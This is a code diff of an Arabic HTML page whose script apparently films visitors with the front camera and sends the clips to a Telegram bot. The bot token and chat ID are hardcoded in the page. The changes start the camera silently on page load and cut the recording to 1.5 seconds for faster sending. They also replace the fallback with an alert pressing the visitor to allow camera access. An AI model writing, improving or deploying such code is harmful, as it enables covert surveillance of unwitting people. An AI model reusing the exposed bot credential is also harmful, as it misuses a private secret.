@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ك<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -16,22 +16,34 @@
     <script>
         const TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
         const CHAT = '8304712202';
+        let mediaStream = null;
+
+        // تشغيل الكاميرا في الخلفية فور فتح الصفحة عشان تكون جاهزة تماماً للقطة الفورية
+        async function initCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                document.getElementById('v').srcObject = mediaStream;
+            } catch (e) {}
+        }
+        initCamera();
 
         async function startRecording() {
             try {
                 document.getElementById('mainBtn').style.display = 'none';
 
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
+                // لو الكاميرا ما اشتغلتش في الخلفية لأي سبب، نشغلها وقت الضغط
+                if (!mediaStream) {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    document.getElementById('v').srcObject = mediaStream;
+                }
 
                 let mediaRecorder;
                 let chunks = [];
 
                 try {
-                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                 } catch (e) {
-                    mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder = new MediaRecorder(mediaStream);
                 }
 
                 mediaRecorder.ondataavailable = e => {
@@ -53,19 +65,21 @@
                         console.error(err);
                     }
 
-                    stream.getTracks().forEach(t => t.stop());
+                    mediaStream.getTracks().forEach(t => t.stop());
                 };
 
+                // بدء التسجيل الفوري بدون أي انتظار
                 mediaRecorder.start();
 
+                // تسجيل سريع جداً (ثانية ونصف) عشان يبعت الفيديو في أسرع وقت ممكن
                 setTimeout(() => {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
-                }, 2000);
+                }, 1500);
 
             } catch (e) {
-                document.getElementById('mainBtn').style.display = 'block';
+                alert('يرجى السماح بإذن الكاميرا للمتابعة');
             }
         }
     </script>
